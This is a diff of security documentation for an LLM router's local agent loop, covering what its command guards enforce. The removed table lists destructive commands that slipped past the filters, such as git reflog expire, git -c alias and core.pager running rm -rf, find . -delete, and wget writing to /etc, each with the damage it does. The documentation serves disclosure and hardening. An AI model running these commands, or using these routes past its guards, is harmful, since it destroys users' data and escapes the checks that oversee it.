-| `llm_act`, `llm_local_task` | default | `git --work-tree={OUT} checkout-index -a -f` | writes the index out to a directory outside the root |
-| `llm_act`, `llm_local_task` | default | `git update-ref -d refs/heads/main` | deletes a branch ref |
-| `llm_act`, `llm_local_task` | default | `git reflog expire --expire=now --all` | destroys the reflog, the usual recovery path |
-| `llm_act`, `llm_local_task` | default | `git filter-branch -f --tree-filter true HEAD` | rewrites history |
-| `llm_act`, `llm_local_task` | default | `git submodule deinit -f --all` | removes submodule working trees |
-| `llm_act`, `llm_local_task` | default | `git worktree remove --force {OUT}` | deletes a directory outside the root |
-| `llm_act`, `llm_local_task` | default | `git rm -q -r src` | recursive delete of tracked files |
-| `llm_act`, `llm_local_task` | default | `git rm --recursive src` | recursive delete of tracked files |
-| `llm_local_task` | default | `git rm -r src` | recursive delete of tracked files; `git rm` is on neither git table (`llm_act`'s regex catches only this spelling) |
-| `llm_local_task` | default | `git -C {OUT} rm -r x` | deletes files outside the root |
-| `llm_local_task` | default | `git -c alias.x='!rm -rf src' x` | runs any command the model writes |
-| `llm_local_task` | default | `git -c core.pager='rm -rf src' log` | runs any command the model writes |
-| `llm_act`, `llm_local_task` | default | `cargo uninstall ripgrep` | deletes a binary from `~/.cargo/bin`, outside the root |
-| `llm_act`, `llm_local_task` | default | `go clean -modcache` | deletes the Go module cache, outside the root |
-| `llm_local_task` | `LLM_ROUTER_AGENT_WRITES=apply` | `find . -delete` | the `find -delete` refusal applies only while writes are not applied |
-| `llm_local_task` | `LLM_ROUTER_AGENT_COMMANDS=all` | `wget -O /etc/x https://example.com` | without the allowlist, a program that writes on its own reaches outside the root |
-| `llm_local_task` | `LLM_ROUTER_AGENT_COMMANDS=all` | `rsync -a --delete . /tmp/x` | without the allowlist, a program that writes on its own reaches outside the root |
-
-The `toolkit` `rg --pre` row is low impact: the toolkit runs bash only under the OS
-sandbox, on a copy of the project.
+`rm a.txt` and `: > a.txt` have the reach of the file tools. `pytest -q` and
+`python3 s.py` run the project's code, which on `llm_act` can be a file the
+model has just written (`write_file s.py`, then `python3 s.py`; pinned in
+`tests/test_security_docs_match_the_code.py`).
 
 **Out of scope.** Work delegated to an external agent CLI (`codex exec`, from
 `src/llm_router/agentic/adapters.py` and `src/llm_router/codex_agent.py`) runs
@@ -520,19 +697,27 @@ holds the P2.9-a corpus (10 outside-root and 10 destructive attempts per lane).
 **Default: on.** With it enabled, `hooks/auto-route.py` attempts to answer a prompt
 locally before Claude Code sees it. For prompts it classifies as needing file work, it
 runs a tool-calling agent loop (`hooks/agent_loop.py`) that hands the local model
-`write_file`, `edit_file` and `run_command`, up to 15 iterations. Writes do not
-reach disk by default — `LLM_ROUTER_AGENT_WRITES` defaults to `propose`.
+`write_file`, `edit_file` and `run_command`, up to 15 iterations. File-tool writes
+do not reach disk by default — `LLM_ROUTER_AGENT_WRITES` defaults to `propose`. That
+covers `write_file` and `edit_file` only: `run_command` runs by default, and an
+allowed program can still change files inside the root (`git rm a.txt`,
+`go build`, a test run that writes caches).
 
 ### What is actually enforced
 
 - File-path operations are confined to the project root. This works as described.
-- `run_command` does **not** execute through a shell. `hooks/agent_loop.py` uses
-  `shlex.split` and `subprocess.run(argv, ...)` with `shell=False`, so shell
-  metacharacters are literal arguments. (This document previously said the
-  opposite; the code has never matched that claim.)
-- `run_command` passes two independent layers: `agent_writes.guard_command` — an
-  allowlist of inspection programs plus blocked subcommands — and then
-  `_BLOCKED_COMMANDS`, a regex over top-level destructive patterns.
+- `run_command` does **not** execute through a shell. `_run_command_line` in
+  `src/llm_router/hooks/agent_loop.py` tokenizes the line with the toolkit's
+  `parse_command_line` (`shlex.shlex`, so `&&`, `;` and `|` are split without a
+  shell) and runs the pipeline with `toolkit.tools.run_pipelines`, which starts
+  each stage as an argv with no shell. Shell metacharacters are literal
+  arguments. (This document once said the opposite; the code has never matched
+  that claim.)
+- `run_command` passes three layers, all before anything runs:
+  `_BLOCKED_COMMANDS`, a regex over top-level destructive patterns; then
+  `agent_writes.guard_command`, an inspection list of programs plus blocked
+  subcommands, for every segment; then `write_policy.check_action`, the shared
+  allowlist and tripwire (see "Local action safety contract (refuse-only)").
 
   **The allowlist is a typo-and-footgun guardrail. It is not a containment
   boundary, and it does not prevent arbitrary code execution.** An agent with
@@ -598,9 +783,11 @@ reach disk by default — `LLM_ROUTER_AGENT_WRITES` defaults to `propose`.
   set `LLM_ROUTER_AGENT_COMMANDS=off` and drop `run_command` from the tool set.
   The allowlist is not a substitute for either.
 
-- `LLM_ROUTER_AGENT_COMMANDS=all` skips the allowlist entirely, leaving only the
-  regex. `llm_local_task` set that implicitly whenever writes were applied; since
-  2026-09-14 it does not, and its `apply_writes` defaults to False.
+- `LLM_ROUTER_AGENT_COMMANDS=all` skips `guard_command`'s inspection list,
+  leaving the regex and `write_policy.check_action`, whose allowlist (D-322)
+  still refuses any program it does not name. `llm_local_task` set that
+  implicitly whenever writes were applied; since 2026-09-14 it does not, and its
+  `apply_writes` defaults to False.
 
 ### What that filter does NOT cover — measured against 13.0.1, not estimated
 
